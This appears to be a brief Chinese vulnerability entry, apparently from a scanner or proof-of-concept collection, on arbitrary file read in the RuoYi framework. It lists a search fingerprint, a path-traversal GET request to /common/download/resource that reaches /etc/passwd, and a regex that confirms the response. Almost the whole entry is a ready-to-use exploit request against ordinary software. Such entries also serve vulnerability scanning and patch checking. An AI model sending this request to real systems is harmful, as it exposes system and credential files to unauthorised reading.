# 若依RuoYi系统任意文件读取

若依 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app.name="RuoYi 若依"`
- **请求**：`GET /common/download/resource?resource=/profile/../../../../../../../etc/passwd  HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$